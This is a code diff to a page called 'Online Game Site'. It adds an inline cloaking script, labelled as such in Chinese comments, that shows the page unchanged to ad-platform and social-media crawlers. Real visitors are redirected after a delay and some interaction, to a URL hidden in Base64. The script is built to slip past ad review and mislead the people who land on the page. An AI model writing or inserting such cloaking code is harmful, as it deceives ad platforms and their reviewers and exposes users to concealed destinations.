@@ -24,26 +24,23 @@
   gtag("js", new Date());
   gtag("config", "G-PF5LNZJYLL");
 </script>
-<script type="text/javascript" src="assets/js/script.js"></script>
 
 <title>Online Game Site</title>
 
+<!-- === Cloaking 跳转（无权限弹框版） === -->
 <script>
-// === Cloaking 配置 ===
-const REG_PAGE =  "https://google.com"; // 真实用户跳转地址
+const REG_PAGE_ENC = "aHR0cHM6Ly95b3VyLXJlZy1wYWdlLmNvbQ=="; // Base64 隐藏跳转地址
 const DELAY_MS = 5000; // 延迟跳转时间（毫秒）
 const BOT_UA = [
   "facebookexternalhit","Facebot","Twitterbot","Slackbot",
   "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
 ];
 
-// 检测爬虫 UA
 function isBot(){
   const ua = navigator.userAgent;
   return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
 }
 
-// 检测是否移动设备
 function isMobile(){
   const ua = navigator.userAgent;
   const mobileKeywords = [
@@ -52,7 +49,6 @@ function isMobile(){
   return mobileKeywords.some(k => ua.includes(k));
 }
 
-// 行为检测变量
 let userActive = false;
 
 // 移动端触摸检测
@@ -62,36 +58,24 @@ window.addEventListener('touchstart', () => { userActive = true; }, { once: true
 window.addEventListener('mousemove', () => { userActive = true; }, { once: true });
 window.addEventListener('keydown', () => { userActive = true; }, { once: true });
 
-// 陀螺仪检测（仅移动端）
-let hasGyro = false;
-if (window.DeviceMotionEvent) {
-  window.addEventListener("devicemotion", function(event) {
-    if (event.accelerationIncludingGravity) {
-      hasGyro = true;
-    }
-  }, { once: true });
-}
-
-// 延迟执行判断
+// 延迟判断并跳转
 setTimeout(() => {
   if (!isBot()) {
+    const regUrl = atob(REG_PAGE_ENC); // 解码
     if (isMobile()) {
-      // 移动端逻辑：触摸 + 陀螺仪
-      if (userActive && hasGyro) {
-        window.location.href = REG_PAGE;
+      if (userActive) {
+        window.location.replace(regUrl);
       }
     } else {
-      // 桌面端逻辑：鼠标/键盘交互
       if (userActive) {
-        window.location.href = REG_PAGE;
+        window.location.replace(regUrl);
       }
     }
-  } else {
-    console.log("检测到广告平台爬虫，保持原页面");
   }
 }, DELAY_MS);
 </script>
 </head>
+
 <body>
 <header>
   <h1>Online Game Site</h1>
